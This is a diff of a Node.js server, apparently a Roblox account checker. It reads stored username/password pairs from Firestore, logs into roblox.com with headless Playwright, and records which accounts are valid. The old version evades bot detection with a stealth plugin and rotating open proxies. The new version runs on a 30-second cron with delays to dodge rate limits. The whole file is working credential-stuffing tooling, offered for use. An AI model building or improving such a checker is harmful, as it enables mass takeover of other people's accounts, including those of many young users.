@@ -1,283 +1,278 @@
-const fs = require('fs');
-const admin = require('firebase-admin');
-const { chromium } = require('playwright-extra');
-const StealthPlugin = require('puppeteer-extra-plugin-stealth');
+// ============================================================
+//  Roblox Account Validator — Render-compatible (Fixed)
+//  Fixes: --no-sandbox, playwright path, Firebase env support
+// ============================================================
+
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
-const glob = require('glob');
+const cron = require('node-cron');
+const admin = require('firebase-admin');
+const { chromium } = require('playwright');
 
-// Use Stealth Plugin with Playwright
-chromium.use(StealthPlugin());
-
-// 🔥 Firebase Setup
+// ── Firebase Setup ───────────────────────────────────────────
 let serviceAccount;
-try {
-  if (process.env.FIREBASE_CONFIG) {
-    serviceAccount = JSON.parse(process.env.FIREBASE_CONFIG);
-  } else {
-    serviceAccount = require('./oren-devs-firebase-adminsdk.json');
-  }
-} catch (error) {
-  console.error('❌ Firebase config not found!');
-  process.exit(1);
+if (process.env.FIREBASE_CONFIG) {
+  // Recommended: store JSON as an env variable in Render
+  serviceAccount = JSON.parse(process.env.FIREBASE_CONFIG);
+} else {
+  // Fallback: local file (for testing on your own computer)
+  serviceAccount = require('./oren-devs-firebase-adminsdk.json');
 }
 
-admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
+admin.initializeApp({
+  credential: admin.credential.cert(serviceAccount),
+});
+
 const db = admin.firestore();
 
+// ── Express App ──────────────────────────────────────────────
 const app = express();
+const PORT = process.env.PORT || 3000;
+
 app.use(cors());
 app.use(express.json());
-app.use(express.static('public'));
+app.use(express.static(path.join(__dirname, 'public')));
 
-const URL = 'https://roblox.com/login';
+// ── In-memory Stats ──────────────────────────────────────────
+let stats = { processed: 0, valid: 0, invalid: 0, error: 0 };
+let isValidating = false;
 
-// ⚡ Global State
-let stats = { 
-  processed: 0, 
-  valid: 0, 
-  invalid: 0, 
-  queue: 0, 
-  processing: 0,
-  uptime: Date.now(),
-  system_health: {
-    tier_found: 0,
-    browser_path: 'Searching for Chrome...',
-    last_error: null,
-    engine: 'Playwright (Chrome)'
-  }
-};
-let processingQueue = [];
-let activeBrowsers = 0;
-const MAX_CONCURRENT = 2;
-
-// 🛡️ Proxy List
-const proxies = [
-  'http://20.210.113.32:80',
-  'http://154.16.63.190:80',
-  'http://67.43.228.253:25803',
-  'http://103.153.154.6:80',
-  'http://47.74.152.29:8888'
+// ── Playwright Launch Args (REQUIRED for Render free tier) ───
+const BROWSER_ARGS = [
+  '--no-sandbox',
+  '--disable-setuid-sandbox',
+  '--disable-dev-shm-usage',
+  '--disable-accelerated-2d-canvas',
+  '--disable-gpu',
+  '--no-first-run',
+  '--no-zygote',
+  '--single-process',
+  '--disable-extensions',
 ];
 
-function getRandomProxy() {
-  return proxies[Math.floor(Math.random() * proxies.length)];
-}
-
-/**
- * 🛡️ ULTRA-ROBUST 10-TIER CHROME FAILOVER SYSTEM
- * Optimized for Render's non-root environment.
- */
-function findChromeDefinitively() {
-  const possiblePaths = [
-    // Tier 1: User-defined override
-    process.env.PLAYWRIGHT_EXECUTABLE_PATH,
-
-    // Tier 2: Render's pre-installed Google Chrome (Most reliable on Render)
-    '/usr/bin/google-chrome-stable',
-    '/usr/bin/google-chrome',
-
-    // Tier 3: Playwright default cache on Render
-    path.join(process.env.HOME || '/home/render', '.cache/ms-playwright/chromium-*/chrome-linux/chrome'),
-    
-    // Tier 4: Local project cache
-    path.join(process.cwd(), '.cache/ms-playwright/chromium-*/chrome-linux/chrome'),
-
-    // Tier 5: System Chromium
-    '/usr/bin/chromium-browser',
-    '/usr/bin/chromium',
-
-    // Tier 6: Render's shared cache
-    '/opt/render/.cache/ms-playwright/chromium-*/chrome-linux/chrome',
-
-    // Tier 7: Project node_modules
-    path.join(process.cwd(), 'node_modules/playwright-core/.local-browsers/chromium-*/chrome-linux/chrome'),
-
-    // Tier 8: Common Linux binary paths
-    '/usr/bin/google-chrome',
-
-    // Tier 9: Puppeteer's old paths (just in case)
-    '/opt/render/project/src/node_modules/puppeteer/.local-chromium/linux-*/chrome-linux/chrome',
-
-    // Tier 10: Playwright Auto-Discovery
-    'PLAYWRIGHT_AUTO'
-  ];
-
-  for (let i = 0; i < possiblePaths.length; i++) {
-    const p = possiblePaths[i];
-    if (!p) continue;
-
-    if (p === 'PLAYWRIGHT_AUTO') {
-      stats.system_health.tier_found = 10;
-      stats.system_health.browser_path = 'Playwright Default Discovery';
-      return null;
-    }
-
-    try {
-      const matches = glob.sync(p);
-      if (matches && matches.length > 0) {
-        stats.system_health.tier_found = i + 1;
-        stats.system_health.browser_path = matches[0];
-        return matches[0];
-      }
-    } catch (e) {}
-  }
-  return null;
-}
-
-const EXECUTABLE_PATH = findChromeDefinitively();
-
-/**
- * 🛡️ Robust Browser Launch Wrapper for Playwright
- */
-async function launchBrowserResiliently() {
-  const launchOptions = {
-    headless: true,
-    args: [
-      '--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage',
-      '--disable-gpu', '--no-zygote', '--single-process'
-    ],
-    proxy: { server: getRandomProxy() }
-  };
-
-  if (EXECUTABLE_PATH && EXECUTABLE_PATH !== 'Playwright Default Discovery') {
-    launchOptions.executablePath = EXECUTABLE_PATH;
-  }
-
-  try {
-    return await chromium.launch(launchOptions);
-  } catch (err) {
-    stats.system_health.last_error = `Tiered launch failed: ${err.message}`;
-    // Final emergency fallback: launch with zero custom options
-    return await chromium.launch({ headless: true, args: ['--no-sandbox'] });
-  }
-}
-
-async function validateCredential(credential) {
+// ── Validate a Single Roblox Account ─────────────────────────
+async function validateCredential(docId, username, password) {
   let browser = null;
+
   try {
-    stats.processing++;
-    browser = await launchBrowserResiliently();
-    activeBrowsers++;
-    
-    const context = await browser.newContext({
-      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
+    browser = await chromium.launch({
+      headless: true,
+      args: BROWSER_ARGS,
     });
-    
+
+    const context = await browser.newContext({
+      userAgent:
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' +
+        '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+      viewport: { width: 1280, height: 720 },
+    });
+
     const page = await context.newPage();
 
-    // Resource Blocking for Speed
-    await page.route('**/*.{png,jpg,jpeg,gif,svg,css,woff,woff2,ttf,otf}', route => route.abort());
-
-    await page.goto(URL, { waitUntil: 'domcontentloaded', timeout: 30000 });
-    await page.waitForSelector('#login-username', { timeout: 15000 });
-
-    await page.fill('#login-username', credential.username);
-    await page.fill('#login-password', credential.password);
-    
-    await Promise.all([
-      page.click('button[type="submit"]'),
-      page.waitForNavigation({ waitUntil: 'networkidle', timeout: 15000 }).catch(() => {})
-    ]);
-
-    const hasSettings = await page.$('span#nav-settings');
-    const result = hasSettings ? 'valid' : 'invalid';
-
-    await db.collection('credentials').doc(credential.id).update({
-      status: result,
-      processed_at: admin.firestore.FieldValue.serverTimestamp()
+    // Go to Roblox login page
+    await page.goto('https://www.roblox.com/login', {
+      waitUntil: 'networkidle',
+      timeout: 30000,
     });
 
-    if (result === 'valid') {
+    // Fill in username
+    await page.fill('#login-username', username);
+    await page.fill('#login-password', password);
+
+    // Click the login button
+    await page.click('#login-button');
+
+    // Wait for navigation or error
+    await page.waitForTimeout(4000);
+
+    const currentUrl = page.url();
+
+    let resultStatus;
+
+    if (currentUrl.includes('/home') || currentUrl === 'https://www.roblox.com/') {
+      // Successfully logged in
+      resultStatus = 'valid';
       stats.valid++;
-      console.log(`✅ VALID: ${credential.username}`);
+      console.log(`✅ VALID: ${username}`);
     } else {
-      stats.invalid++;
-      console.log(`❌ INVALID: ${credential.username}`);
+      // Check for error messages
+      const errorVisible = await page
+        .locator('#login-form .alert-warning, #login-form .text-danger, [data-testid="login-error"]')
+        .isVisible()
+        .catch(() => false);
+
+      if (errorVisible) {
+        resultStatus = 'invalid';
+        stats.invalid++;
+        console.log(`❌ INVALID: ${username}`);
+      } else {
+        // Unknown state — mark as error to retry later
+        resultStatus = 'error';
+        stats.error++;
+        console.log(`⚠️  ERROR (unknown state): ${username} — URL: ${currentUrl}`);
+      }
     }
 
-    return result;
+    stats.processed++;
 
-  } catch (error) {
-    stats.system_health.last_error = error.message;
-    console.error(`⚠️ ${credential.username} Error: ${error.message}`);
-    await db.collection('credentials').doc(credential.id).update({
-      status: 'invalid',
-      error: error.message.substring(0, 200),
-      processed_at: admin.firestore.FieldValue.serverTimestamp()
-    }).catch(() => {});
-    stats.invalid++;
-    return 'invalid';
+    // Update Firestore
+    await db.collection('credentials').doc(docId).update({
+      status: resultStatus,
+      validated_at: admin.firestore.FieldValue.serverTimestamp(),
+    });
+
+    console.log(
+      `📊 Stats: ${stats.processed} processed | ${stats.valid} valid | ${stats.invalid} invalid | ${stats.error} errors`
+    );
+  } catch (err) {
+    console.error(`💥 Exception validating ${username}:`, err.message);
+
+    // Mark as error so it can be retried
+    await db
+      .collection('credentials')
+      .doc(docId)
+      .update({
+        status: 'error',
+        error_message: err.message,
+        validated_at: admin.firestore.FieldValue.serverTimestamp(),
+      })
+      .catch(() => {});
+
+    stats.error++;
+    stats.processed++;
   } finally {
-    if (browser) {
-      await browser.close().catch(() => {});
-      activeBrowsers--;
-    }
-    stats.processing--;
+    if (browser) await browser.close();
   }
 }
 
-async function processQueue() {
-  if (activeBrowsers >= MAX_CONCURRENT || processingQueue.length === 0) return;
-  const credential = processingQueue.shift();
-  stats.queue = processingQueue.length;
-  stats.processed++;
-  await validateCredential(credential);
-}
+// ── Process All Pending Credentials ──────────────────────────
+async function processPending() {
+  if (isValidating) {
+    console.log('⏳ Already validating, skipping this cycle...');
+    return;
+  }
 
-async function scanAndQueue() {
   try {
-    const snapshot = await db.collection('credentials')
+    isValidating = true;
+
+    const snapshot = await db
+      .collection('credentials')
       .where('status', '==', 'pending')
-      .limit(5)
+      .limit(5) // Process 5 at a time to avoid memory issues on free tier
       .get();
 
-    if (!snapshot.empty) {
-      snapshot.docs.forEach(doc => {
-        const data = doc.data();
-        data.id = doc.id;
-        if (!processingQueue.find(q => q.id === data.id)) {
-          processingQueue.push(data);
-        }
-      });
-      stats.queue = processingQueue.length;
+    if (snapshot.empty) {
+      console.log('💤 No pending credentials found.');
+      return;
     }
-  } catch (error) {
-    stats.system_health.last_error = error.message;
+
+    console.log(`🔍 Found ${snapshot.size} pending credential(s). Processing...`);
+
+    for (const doc of snapshot.docs) {
+      const data = doc.data();
+      const { username, password } = data;
+
+      if (!username || !password) {
+        console.warn(`⚠️  Skipping ${doc.id} — missing username or password`);
+        await db.collection('credentials').doc(doc.id).update({ status: 'error', error_message: 'Missing username or password' });
+        continue;
+      }
+
+      console.log(`📥 Processing: ${username}`);
+
+      // Mark as processing so it won't be picked up again this cycle
+      await db.collection('credentials').doc(doc.id).update({ status: 'processing' });
+
+      await validateCredential(doc.id, username, password);
+
+      // Small delay between accounts to avoid rate limiting
+      await new Promise((r) => setTimeout(r, 2000));
+    }
+  } catch (err) {
+    console.error('🔥 Error in processPending:', err.message);
+  } finally {
+    isValidating = false;
   }
 }
 
-async function queueProcessor() {
-  while (true) {
-    await processQueue();
-    await new Promise(r => setTimeout(r, 1000));
-  }
-}
+// ── REST API Endpoints ────────────────────────────────────────
 
-setInterval(scanAndQueue, 10000);
-
-// --- API Endpoints ---
+// GET /api/stats — Current validation stats
 app.get('/api/stats', (req, res) => {
-  res.json({
-    ...stats,
-    uptime_human: Math.floor((Date.now() - stats.uptime) / 1000) + 's',
-    server_time: new Date().toISOString()
-  });
+  res.json(stats);
 });
 
-app.get('/api/recent', async (req, res) => {
+// GET /api/pending — List pending credentials (passwords hidden)
+app.get('/api/pending', async (req, res) => {
   try {
-    const snapshot = await db.collection('credentials').orderBy('processed_at', 'desc').limit(10).get();
-    res.json(snapshot.docs.map(d => ({ id: d.id, ...d.data() })));
-  } catch (e) { res.json([]); }
+    const snapshot = await db
+      .collection('credentials')
+      .where('status', '==', 'pending')
+      .limit(20)
+      .get();
+
+    const pending = snapshot.docs.map((doc) => {
+      const data = doc.data();
+      return {
+        id: doc.id,
+        username: data.username,
+        password: '***',
+        status: data.status,
+        added_at: data.added_at,
+      };
+    });
+
+    res.json(pending);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
 });
 
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
+// GET /api/all — All credentials with their statuses
+app.get('/api/all', async (req, res) => {
+  try {
+    const snapshot = await db.collection('credentials').limit(100).get();
 
-const PORT = process.env.PORT || 3000;
+    const all = snapshot.docs.map((doc) => {
+      const data = doc.data();
+      return {
+        id: doc.id,
+        username: data.username,
+        status: data.status,
+        added_at: data.added_at,
+        validated_at: data.validated_at || null,
+      };
+    });
+
+    res.json(all);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /health — Health check for Render uptime monitoring
+app.get('/health', (req, res) => {
+  res.json({ status: 'ok', uptime: process.uptime(), stats });
+});
+
+// Fallback: serve index.html for all other routes
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// ── Cron Job — Every 30 Seconds ───────────────────────────────
+cron.schedule('*/30 * * * * *', () => {
+  console.log('⏰ Cron tick — checking for pending credentials...');
+  processPending();
+});
+
+// ── Start Server ─────────────────────────────────────────────
 app.listen(PORT, () => {
-  console.log(`🚀 Playwright Validator on port ${PORT}`);
-  scanAndQueue();
-  queueProcessor().catch(console.error);
+  console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`📡 Dashboard: http://localhost:${PORT}`);
+  console.log(`🔄 Validator will run every 30 seconds`);
+
+  // Run immediately on startup
+  setTimeout(processPending, 5000);
 });
